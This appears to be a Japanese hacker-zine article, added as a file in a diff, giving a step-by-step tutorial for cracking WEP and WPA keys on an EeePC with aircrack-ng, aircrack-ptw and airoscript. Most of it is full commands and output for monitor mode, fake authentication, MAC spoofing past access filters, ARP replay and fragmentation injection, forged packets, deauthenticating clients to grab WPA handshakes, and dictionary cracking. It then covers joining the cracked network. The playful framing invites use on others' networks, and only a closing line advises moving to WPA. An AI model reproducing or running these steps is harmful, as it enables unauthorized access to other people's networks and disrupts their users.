@@ -1,0 +1,602 @@
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第○章: EeePCで無線LANハック  ---
+
+著者：エクセル小林
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　やあやあ。9900+α時間ぶりのこんばんは、そうじゃない人は初めまして。どう
+もエクセル小林です。
+
+　今回は「そろそろ次世代機が出るのに僕は4Gを買ってしまったよ記念」と称し、
+EeePCだけでWEPとWPAキーの解読したいと思います。まあ”だけ”といっても、E
+eePCをブンブン振り回して解読するワケにもいきませんので、「Aircrack-ng」と
+「aircrack-ptw」というツールを使っていきますが（笑
+　ここでMEISEKIな頭脳の方は「あれ？　解読って特定の無線LANカード（以下、
+NIC）とか必要じゃね？　でもEeePCってPCカード挿すとこなくね？　できなくね
+？」と思うかもしれませんが、実はEeePC単体だけでオッケーだったりします。他
+のラップトップがどうなのかわかりませんが、EeePCに搭載されているNICのチッ
+プはAtherosであるため、別途何かを購入する必要もなく、そのままデフォルトで
+オッケーでござるよｹｿｲﾁどのというワケです。にんにん。
+
+　さあキミも暗い部屋に引き篭もっていないで外に出よう！　そして垂れ流され
+ている（環境保護の為、一部文章の閲覧を修正させていただきました）しよう！！
+
+
+■0x02.) Aircrack-ngとaircrack-ptwってなによ？
+
+　藪からスティックにツール名をいわれてもよくわからんと思うので、とりあえ
+ず今回使用するツールについて簡単に説明しましょう。
+
+・Aircrack-ng
+　これがなければお話になりませんって感じなツールキットです。含まれている
+ツールを使えばキー解読はもちろんのこと、kismetみたいな周囲のアクセスポイ
+ント（以下、AP）の発見やIV（暗号化に使われる乱数列の基の数値）の蒐集、能
+動的なパケットの発生、NICのモード変更までもが可能なとんでもねえヤツです。
+
+公式サイト（http://www.aircrack-ng.org/doku.php）
+
+・aircrack-ptw
+　これはAircrack-ngに含まれるキー解読ツールのaircrack-ngの進化形だと思っ
+てくれちゃってオッケーです。解読に必要なパケット数が異常に少いため、短時
+間でCOOLに解読できちゃいます。話のわかるヤツだ。
+
+公式サイト（http://www.cdc.informatik.tu-darmstadt.de/aircrack-ptw/）
+
+
+■0x03.) 環境を作る
+
+　兎にも角にも、まずは環境を整えなければお話になりません。
+　できることならプリインストールされている策略と謀略と疑念と疑惑とあとア
+レに包まれたWindows XPでやりたいところですが、Aircrack-ngとaircrack-ptwは
+Linux系のみで動作するので、OSを新たにインストールする必要があります。まあ、
+Windows XPでも移植されたものが一応動作しますが、いくつかのツールが使えな
+かったりするので、パケットをキャプチャするのにドラ時間がかかっちゃいます。
+よっぽど運がよくない限り、解読中にEeePCの電源が間違いなく落ちることでしょ
+う。ショッキング！
+
+　というワケで、今回はLinux系XubuntuをEeePC用にカスタマイズした「eeeXubu
+ntu」をインストールするコトにします。コイツはmadwifiが初めから導入されて
+いたり、EeePC用のホットキーがデフォルトで使えたりするので、めんどくさがり
+の僕にはピッタリな一品なワケです。
+　ここ（http://wiki.eeeuser.com/ubuntu:eeexubuntu:home）で配布されている
+ISOイメージで起動させ、デスクトップにある「インストール」をクリックしてあ
+とはウィザードに従ってください。SDHCにインストールしたい人は「ubuntu SDH
+C」でグーグル先生にお願いすると幸せになれるかもしれません。
+
+　サクサクっとインストールが終了しましたら、続いてAircrack-ngをインストー
+ルしていきます。
+　Linux系場合はmakeコマンドでソースから大抵インストールするコトが多いです
+が、eeeXubuntuには「Synaptic パッケージマネージャ」なるアプリケーションを
+簡単にインストールできる機能がありますので、そこからインストールすること
+にします。[システム]→[Synaptic パッケージマネージャ]を開き、[設定]→[リ
+ポジトリ]からインターネットからダウンロードをすべてチェックしてから、検索
+でAircrack-ngを見つけてインストールします。
+
+　次にaircrack-ptwを以下のような感じでインストールします。
+　もしmakeの際に「エラーでありやがりますよコノヤローヽ(｀Д´）ノ」と吐か
+れる場合は、libpcapというパケットキャプチャ用ライブラリがなんだかDAMEにな
+っているので、インストールし直す必要があります。ソースからでもいいですが、
+これも「Synaptic パッケージマネージャ」からで大丈夫です。
+
+-----
+# cd /usr/local/src
+# wget http://www.cdc.informatik.tu-darmstadt.de/aircrack-ptw/download/aircrack-ptw-1.0.0.tar.gz
+# tar -zxvf aircrack-ptw-1.0.0.tar.gz
+# cd aircrack-ptw-1.0.0
+# make
+# make install
+# cp aircrack-ptw /usr/bin/
+-----
+
+
+■0x04.) 無線LANキー解読
+
+　それでは皆さんお待ちかね、キーの解読に入りましょう。
+　ターゲットAPのBSSIDは「00:11:22:33:44:55」、ESSIDは「niceboat」になりま
+す。
+
+●WEPキーの解読の場合
+
+　eeeXubuntuを起動し、ターミナルを開いて「airmon-ng」と打ち込んで現在装備
+されているNICを確認します。おそらく以下のように表示されるハズです。
+
+-----
+# airmon-ng
+
+Interface       Chipset         Driver
+
+wifi0           Atheros         madwifi-ng
+ath0            Atheros         madwifi-ng VAP (parent: wifi0)
+-----
+
+　続いて「airmon-ng start wifi0」と打ち込んでNICのモード変更です。ath1が
+新たに作られてモニターモードになると思います。このモニターモードというの
+は、その名の通り、空気中に垂れ流されているパケットを無差別に受信するモー
+ドのコトです。
+
+-----
+# airmon-ng start wifi0
+
+Interface       Chipset         Driver
+
+wifi0           Atheros         madwifi-ng
+ath0            Atheros         madwifi-ng VAP (parent: wifi0)
+ath1            Atheros         madwifi-ng VAP (parent: wifi0) (monitor mode enabled)
+-----
+
+　次に「airodump-ng ath1」と入力して周囲のAPを探します。
+
+-----
+ CH  ? ][ Elapsed: 30 s ][ 2007-05-24 11:36
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
+
+ 00:11:22:33:44:55   61      342       36    0   1  54  WEP  WEP         niceboat
+ 66:77:88:99:00:11   32      159       73    0   9  54  WEP  WEP         nakanidaremoimasenyo
+
+ BSSID              STATION            PWR  Lost  Packets  Probes
+
+ 00:11:22:33:44:55  AA:BB:CC:DD:EE:FF   55     0       63  niceboat
+ (not associated)   GG:HH:II:JJ:KK:LL   20     0       15
+-----
+
+　ターゲットAPである00:11:22:33:44:55を無事発見することができました。ツー
+ル側ではどれがお目当てのAPなのかわからず永遠に頑張り続けるため、[ctrl]+[c]
+で終了させてあげてください。
+
+　そして、今度はAPを探すためでなく、airodump-ngをターゲットAPのパケットキ
+ャプチャのために使っていきます。「airodump-ng --bssid <ターゲットAPのBSS
+ID> --c <ターゲットAPのチャンネル> -w <キャプチャファイル名> <使用するNI
+C>」で実行できますので、今回は「airodump-ng --bssid 00:11:22:33:44:55 --c
+ 1 -w /tmp/wep ath1」と入力することにします。キャプチャファイル名の末尾に
+は「-01.cap」や「-02.cap」などが自動的にくっつきます。
+
+-----
+ CH  1 ][ Elapsed: 30 s ][ 2007-05-24 11:40
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
+
+ 00:11:22:33:44:55   61      342       36    0   1  54  WEP  WEP         niceboat
+
+ BSSID              STATION            PWR  Lost  Packets  Probes
+
+ 00:11:22:33:44:55  AA:BB:CC:DD:EE:FF   55     0       63  niceboat
+-----
+
+　ここで雅な人はお気づきだと思いますが、普通にネットサーフィン（死語）し
+ただけではゴーホームしたいぐらい全然まったくIVを頂くことができないコトが
+わかります。なんだよどーすんだよ放置プレイかよ苦手だよなどといった心配し
+ちゃうかもしれませんが、こんなこともあろうかとAircrack-ngﾀﾝには「airepla
+y-ng」というものが装備されています。なななんとコイツはこっちから能動的に
+パケットを大量発生させるコト（パケットインジェクション）ができちゃうんで
+す！　すげえ！
+
+　さて、いつまでたっても増えない#Dataを見ていたってしょうがないので、さっ
+そくパケットインジェクションを実行していきましょう。
+　airodump-ngを動かしつつ、新しいターミナルを開いて「aireplay-ng -1 <何秒
+ごとに実行するか> -a <ターゲットAPのBSSID> -h <使用するNICのMACアドレス> 
+-e <ターゲットAPのESSID> <使用するNIC>」と入力し、ターゲットAPにfakeauth
+（ターゲットAPとNICの関連付け）をします。使用するNICのMACアドレスはiwcof
+igコマンドで確認しておいてください。
+
+-----
+# iwconfig
+lo        no wireless extensions.
+
+eth0      no wireless extensions.
+
+wifi0     no wireless extensions.
+
+ath0      IEEE 802.11g  ESSID:""  Nickname:""
+          Mode:Managed  Frequency:2.457 GHz  Access Point: Not-Associated
+          Bit Rate:0 kb/s   Tx-Power:17 dBm   Sensitivity=1/1
+          Retry:off   RTS thr:off   Fragment thr:off
+          Encryption key:off
+          Power Management:off
+          Link Quality=0/70  Signal level=-98 dBm  Noise level=-98 dBm
+          Rx invalid nwid:2278  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
+
+ath1      IEEE 802.11g  ESSID:""  Nickname:""
+          Mode:Monitor  Frequency:2.457 GHz  Access Point: ZZ:ZZ:ZZ:ZZ:ZZ:ZZ
+          Bit Rate:0 kb/s   Tx-Power:17 dBm   Sensitivity=1/1
+          Retry:off   RTS thr:off   Fragment thr:off
+          Encryption key:off
+          Power Management:off
+          Link Quality=0/70  Signal level=-98 dBm  Noise level=-98 dBm
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
+
+# aireplay-ng -1 0 -a 00:11:22:33:44:55 -h ZZ:ZZ:ZZ:ZZ:ZZ:ZZ -e niceboat ath1
+12:34:19 Waitig for beacon frame (BSSID: 00:11:22:33:44:55)
+12:34:19 Sending Authentication Request 
+12:34:19 Authentication successful 
+12:34:19 Sending Association Request 
+12:34:19 Association successful :-) 
+-----
+
+　このとき、ターゲットAPがMACアドレスによるアクセス制限をしているような場
+合は、使用するNICのMACアドレスをairodump-ngのSTATIONに表示されたターゲッ
+トAPに接続しているユーザーのものに変更しておきましょう。「ifconfig <変更
+するNIC> hw ether <使いたいMACアドレス>」でできます。ターゲットAPに接続し
+ているユーザーがいない場合は潔く諦めてください（笑
+　また、ターゲットAPがANY接続拒否していると、ESSIDがairodump-ngで<length
+: ?>と表示されてしまって見ることができません。こんな場合には「aireplay-n
+g -0 1 -a <ターゲットAPのBSSID> <使用するNIC>」を何度か繰り返すことで、そ
+のうちairodump-ngで確認可能になるハズです。これもターゲットAPに接続してい
+るユーザーがｒｙ。
+
+　そして次にどうやってパケットを送信するかですが、これはターゲットAPに接
+続しているユーザーのアクセスがあるかないかでルート分岐が発生します。使い
+分けるのがめんどくせえ！　って人は後者の方法だけでオッケーです。
+
+　では、まずはアクセスがある場合での方法でレッツラゴーすることにしましょ
+う。
+　この場合は空気中に漂ってるARPリクエストを元にパケットを送信するarprepl
+ayをしますので、「aireplay-ng -3 -b <ターゲットAPのBSSID> -h <使用するNI
+CのMACアドレス> <使用するNIC>」と入力してください。実行後、airodump-ngの
+#Dataがとりつかれた様にどんどん増えていくのがわかると思います。
+
+-----
+# aireplay-ng -3 -b 00:11:22:33:44:55 -h ZZ:ZZ:ZZ:ZZ:ZZ:ZZ ath1
+Saving ARP requests in replay_arp-0123-456789.cap
+You must also start airodump to capture replies.
+Read 51 packets (got 0 ARP requests), sent 0 packets...
+-----
+
+　あとは解読を残すのみなので、もう勝ったようなものです。
+　キャプキャと同時に解読したい人は「aircrack-ng -z <キャプチャファイル名>」
+で、同時に解析できないけど少ないパケットで解読したい人はパケットが集まる
+のを待ってから「aircrack-ptw <キャプチャファイル名>」でスタートすればあと
+は放置でオッケーです。環境によって微妙に変わりますが、WEP128bitはaircrack
+-ngだと800kパケット、aircrack-ptwなら80kパケット集まればほぼ解読可能なハ
+ズです。シエスタでもしながら待っていてください。 
+
+-----
+# aircrack-ng -z /tmp/wep-01.cap
+以下略
+
+# aircrack-ptw /tmp/wep-01.cap
+以下略
+-----
+
+　以上でキーが手に入るハズです。お疲れ様でした。
+
+　続いてアクセスがない場合の方法です。
+　今度は前者と違い、ARPリクエストが漂っていてくれません。よって自分で発生
+させる必要がありますので、ビーコンからパケットを分析するFragmentationをし
+ます。「aireplay-ng -5 -b <ターゲットAPのBSSID> -h <使用するNICのMACアド
+レス> <使用するNIC>」と入力してください。
+
+-----
+# aireplay-ng -5 -b 00:11:22:33:44:55 -h ZZ:ZZ:ZZ:ZZ:ZZ:ZZ ath1
+12:40:35 Waiting for a data packet... 
+Read 52 packets... 
+
+        Size: 154, FromDS: 1, ToDS: 0 (WEP) 
+
+             BSSID = 00:11:22:33:44:55
+         Dest. MAC = AA:AA:AA:AA:AA:AA
+        Source MAC = BB:BB:BB:BB:BB:BB
+
+        0x0000: 0842 0201 000f b5ab cb9d 0014 6c7e decf .B.............. 
+        0x0010: 00d0 cf03 348c e0d2 4001 0000 2b62 7a01 ....4...@...+bz. 
+        0x0020: 6d6d b1e0 92a8 039b ca6f cecb 5364 6e16 mm.......o..Sdn. 
+        0x0030: a21d 2a70 49cf eef8 f9b9 279c 9020 30c4 ..*pI.....'.. 0. 
+        0x0040: 7013 f7f3 5953 1234 5727 146c eeaa a594 p...YS.4W'.l.... 
+        0x0050: fd55 66a2 030f 472d 2682 3957 8429 9ca5 .Uf...G-&.9W.).. 
+        0x0060: 517f 1544 bd82 ad77 fe9a cd99 a43c 52a1 Q.D...w.....<R. 
+        0x0070: 0505 933f af2f 740e ...?./t. 
+        ---CUT---
+
+Use this packet ? y (ここで[y]キーを押す)
+
+Saving chosen packet in replay_src-0123-456789.cap
+12:41:11 Data packet found!
+12:41:11 Sending fragmented packet
+12:41:11 Got RELAYED packet!!
+12:41:11 Thats our ARP packet!
+12:41:11 Trying to get 384 bytes of a keystream
+12:41:11 Got RELAYED packet!!
+12:41:11 Thats our ARP packet!
+12:41:11 Trying to get 1500 bytes of a keystream
+12:41:11 Got RELAYED packet!!
+12:41:11 Thats our ARP packet!
+Saving keystream in fragment-0123-456789.xor
+Now you can build a packet with packetforge-ng out of that 1500 bytes keystream
+-----
+
+　問題なく実行されたら、次はARPリクエストを作るために「packetforge-ng -0
+ -a <ターゲットAPのBSSID> -h <使用するNICのMACアドレス> -k <送信先IPアド
+レス> -l <送信元IPアドレス> -y <Fragmentationで作られた.xor> -w <任意のフ
+ァイル名>」と入力します。送信先IPアドレスはブロードキャストアドレスである
+「255.255.255.255」、送信元IPアドレスは適当で大丈夫です。 
+
+-----
+# packetforge-ng -0 -a 00:11:22:33:44:55 -h ZZ:ZZ:ZZ:ZZ:ZZ:ZZ -k 255.255.255.255 -l 192.168.11.11 -y fragment-0123-456789.xor -w aprr
+Wrote packet to: aprr
+-----
+
+　最後にInteractive packet replayで、自分で作ったARPリクエストを元にパケ
+ットを発生させます。「aireplay-ng -2 -r <packetforge-ngで作ったファイル名
+> <使用するNIC>」と入力してください。実行後、airodump-ngの#Dataが油断なく
+容赦なくどんどん増えていけば成功です。
+
+-----
+# aireplay-ng -2 -r aprr ath1
+
+        Size: 68, FromDS: 0, ToDS: 1 (WEP)
+
+             BSSID = 00:11:22:33:44:55
+         Dest. MAC = AA:AA:AA:AA:AA:AA
+        Source MAC = BB:BB:BB:BB:BB:BB
+
+        0x0000:  0841 de00 0014 6c7e 4080 000f b534 decf  .A....l~@.......
+        0x0010:  ffff ffff ffff 8045 d16a c800 6f4f ddef  ......@E.j..oO..
+        0x0020:  b488 ad7c 9f2a 64f6 ab04 d363 0efe 4162  ...|.*d....c..Ab
+        0x0030:  8ad9 2f74 16bb abcf 232e 97ee 5e45 754d  ../t....#...^EuM
+        0x0040:  23e0 883e                                #..>
+
+Use this packet ? y（ここで[y]キーを押す）
+
+Saving chosen packet in replay_src-1234-567890.cap
+You should also start airodump-ng to capture replies.
+ 
+Sent 512 packets...
+-----
+
+　あとは解読だけですが、方法は前者と変わらないため省略しますのであしから
+ず。
+
+●WPAキーの解読
+
+　ターゲットAPのパケットキャプチャまではWEPと同じなので、解読に必要なハン
+ドシェイクの手に入れ方からいきたいと思います。
+　まずは「aireplay-ng -0 1 -a <ターゲットAPのBSSID> -c <ターゲットAPに接
+続しているユーザーのMACアドレス> <使用するNIC>」と入力してDeauthenticati
+onを実行します。
+
+-----
+# aireplay-ng -0 1 -a 00:11:22:33:44:55 -c XX:XX:XX:XX:XX:XX ath1
+13:25:40 Sending DeAuth to station   -- STMAC: [XX:XX:XX:XX:XX:XX]
+-----
+
+　すると、airodump-ngの右上らへんに「WPA handshake: FF:FF:FF:FF:FF:FF」と
+いうのが出てきますので、それを確認したらairodump-ngを[ctrl]+[c]で終了させ
+ます。
+
+　そうしたらもうあとは解読あるのみです。
+　WPAの場合は辞書アタックしかできませんので「aircrack-ng -w <辞書ファイル
+名> <キャプチャファイル名>」と実行します。この際使用する辞書ファイルに、
+8～63文字の半角英数字の組み合わせ全部が書いてあるもの（サイズがとんでもな
+い大きさになること請け合いですが）を指定することで必ず解読するコトができ
+るハズです。コレ正論よね。
+
+-----
+# aircrack-ng -w /tmp/dic /tmp/wpa-01.cap
+以下略
+-----
+
+　以上でキーが手に入るハズです。ご苦労様でした。
+
+
+■0x05.) ソビエトロシアではVMWareがあなたを使用する！！
+
+　上の解説を長々としてから書くのはものすごーくアレなんですけども、実はた
+った数回の入力であとは自動的に、しかもWindows上で動作する対話式のすんげえ
+簡単な方法あったりします。ならそれをハナから紹介しろよヴォケが！と思わな
+くなくなくないかもしれませんが、この方法はEeePC単体ではできず、チップセッ
+トが「rtl8187」「rt2570」「rt73」であるUSB無線LANアダプタが必要なので今回
+の趣旨とは違うってコトで勘弁してください（笑
+　んでその方法ってのは、皆さまお馴染みの仮想マシンソフト「VMWare」でにai
+rcrack-ngがすでインストールされているOSをマウントして解読な感じです。
+
+　それでは環境整備をしましょう。
+　Windowsをザクザクとインストール（説明略）し、皆さまお馴染みの仮想マシン
+ソフト「VMWare」をインストールします。お金のある人はWorkstationでも構いま
+せんが、べつにPlayerで十分です。そして（ftp://vmware.aircrack-ng.org/）か
+らvmware-aircrack-ng-v4.7zをダウンロードして展開すればオッケーです。この
+ときUSB無線LANアダプタは手に持っておいてください。重要です（大分嘘）
+
+　整備が終わりましたらさっそく解読を始めます。ターゲットAPのBSSIDとESSID
+は上記と同じく「00:11:22:33:44:55」と「niceboat」です。
+　VMwareでaircrack.vmxを開き、文字列のズラズラを堪能して起動が完了したら、
+USB無線LANアダプタをおもむろに挿入します。するとツールバーになんか出てき
+ますので、クリックして認識させます。
+　次に、[左下の無線っぽいアイコン]→[自分の使っているチップセット]→[Sta
+rt_○○]を実行してからairosciptを起動します。このときに使用するインターフ
+ェイスを聞かれるので、適当なヤツのキーを入力してください。
+
+-----
+#######################################
+###     Select your interface       ###
+
+1) rausb0
+#1
+-----
+
+-----
+#######################################
+### What do you want to do?         ###
+### 1) Scan    - Scan for target    ###
+### 2) Select  - Select target      ###
+### 3) Attack  - Attack target      ###
+### 4) Crack   - Get target key     ###
+### 5) Config  - Connect to target  ###
+### 6) Fakeauth- Auth with target   ###
+### 7) Deauth  - Deauth from target ###
+### 8) Reset   - Reset interface    ###
+### 9) Monitor - Airmon-ng device   ###
+###10) Quit    - Quits airoscript   ###
+###11) Test    - Test injection     ###
+###12) ChangeMac- Change your MAC   ###
+#######################################
+### Airodump closed, select a target###
+#?
+-----
+
+　上のようにAirosciptのウィンドウが表示されたら、まずは[1]と入力（以下、
+[1]や[2]）してフィルタやチャンネルを選び、周囲のAPを探します。
+
+-----
+#######################################
+###     Select AP specification     ###
+###                                 ###
+###   1) No filter                  ###
+###   2) OPN                        ###
+###   3) WEP                        ###
+###   4) WPA                        ###
+###   5) WPA1                       ###
+###   6) WPA2                       ###
+###                                 ###
+#######################################
+1
+
+#######################################
+###  Select channel to use          ###
+###                                 ###
+###   1) Channel Hopping            ###
+###   2) Specific channel(s)        ###
+###                                 ###
+#######################################
+1
+-----
+
+-----
+ CH  ? ][ Elapsed: 29 s ][ 2007-05-25 13:10
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
+ 
+ 00:11:22:33:44:55   66      253       57    0   1  54  WEP  WEP         niceboat
+ 66:77:88:99:00:11   26      122       12    0   9  54  WEP  WEP         nakanidaremoimasenyo
+
+ BSSID              STATION            PWR  Lost  Packets  Probes
+
+ 00:11:22:33:44:55  AA:BB:CC:DD:EE:FF   65     0       53  niceboat
+ (not associated)   GG:HH:II:JJ:KK:LL   21     0       12
+-----
+
+　ターゲットAPである00:11:22:33:44:55を無事発見することができました。こち
+らもツール側ではどれがお目当てのAPなのかわからないので永遠に頑張り続けま
+すから、気が済んだら[ctrl]+[c]で終了させます。
+
+　続いて、[2]でターゲットAPを選択します。リストには[1]でスキャンされたAP
+のみ表示されるようです。
+
+-----
+#######################################
+### Select Target from this list    ###
+
+ #      MAC                      CHAN    SECU    POWER   #CHAR   SSID
+
+ 1)     00:11:22:33:44:55        1       WEP     97      12      niceboat
+ 2)     66:77:88:99:00:11        9       WEP     42      15      nakanidaremoimasenyo
+
+###     Select target              ###
+#1
+
+#######################################
+### Do you want to select a client? ###
+###                                 ###
+###   1) Yes, only associated       ###
+###   2) No i dont want to          ###
+###   3) Try to detect some         ###
+###   4) Yes show me the clients    ###
+###   5) Correct the SSID first     ###
+###                                 ###
+#######################################
+1
+-----
+
+　そして、[3]で状況に合ったパケットインジェクションを開始させましょう。ア
+タック方法は大体「1)  Fake auth => Automatic」を選んでおけばオッケーです。
+まあイロイロ試してみるのもいいかもしれません。
+　ウィンドウが3つくらい出てきてアタックが開始され、#Dataの値が増加してい
+るのを確認できたら成功です。
+
+-----
+#######################################
+### Attacks not using a client      ###
+### 1)  Fake auth => Automatic      ###
+### 2)  Fake auth => Interactive    ###
+### 3)  Fragmentation attack        ###
+### 4)  Chopchop attack             ###
+#######################################
+### Attacks using a client          ###
+### 5)  ARP replay => Automatic     ###
+### 6)  ARP replay => Interactive   ###
+### 7)  Fragmentation attack        ###
+### 8)  Chopchop attack             ###
+#######################################
+### Injection if xor file generated ###
+### 9)  Chopchop injection          ###
+### 10) Chopchop injection client   ###
+### 11) Fragment injection          ###
+### 12) Fragment injection client   ###
+### 13) ARP inject from xor (PSK)   ###
+#1
+-----
+
+　最後に、[4]で好きな解読方法を指定してスタートさせれば、あとは放置プレイ
+のオールオッケーです。
+
+-----
+#######################################
+###      WEP CRACKING OPTIONS       ###
+###                                 ###
+###   1) aircrack-ng PTW attack     ###
+###   2) aircrack-ng standard       ###
+###   3) aircrack-ng user options   ###
+###   4) wesside-ng attack          ###
+###                                 ###
+#######################################
+1
+-----
+
+-----
+Opening /wifi/00:11:22:33:44:55-01.cap
+以下略
+-----
+
+　以上でキーが手に入るハズです。お疲れ様……は必要ないですね（笑
+
+
+■0x06.) 無線で接続する
+
+　キーを手に入れたからには、一度は接続するのが華ってもんです。
+
+　しかし、eeeXubuntuで無線接続しようとすると、僕の環境だけなのかもわかり
+ませんが、なんだか繋げないことが多いのです。なので、Windows XPで接続する
+ことにします（ヘタレでごめんなさい）。
+　まあ普通に繋げるのは説明不要でしょうから省略しますが、ANY接続拒否されて
+いるために利用可能なネットワーク一覧に出てこないAPの接続方法がわからない
+人が案外いると思います。
+　こういった接続は、ネットワーク接続のワイヤレスネットワーク接続から[プロ
+パティ]→[ワイヤレスネットワーク]→[追加]のネットワーク名にESSIDを、ネッ
+トワークキーにはWEPキーあるいはWPAキーを入力すればオッケーです。なお、Wi
+ndows XPではASCII文字列でしかキーを入力できませんので、aircrack-ptwで解読
+した場合には（http://xls.grrr.jp/js/hex.html）等々で変換してから入力して
+ください。
+　また、接続したいAPがMACアドレスによるアクセス制限をしている場合には、M
+ACアドレスをairodump-ngで確認したものに変更する必要があります。ネットワー
+ク接続のワイヤレスネットワーク接続から[プロパティ]→[構成]→[詳細設定]→
+[Network Address]からでオッケーです。
+
+
+■0x07.) おわりに
+
+　いやー、無線LANは怖いなあ。すっとこどっこいなWEPでゆっくりしてたら腐っ
+てしまいます。無線LAN使ってる人は、さっさとWPAに移行したほうが身のためで
+す。
+
+　では、機会があったらまた会いましょう。
+
+
+
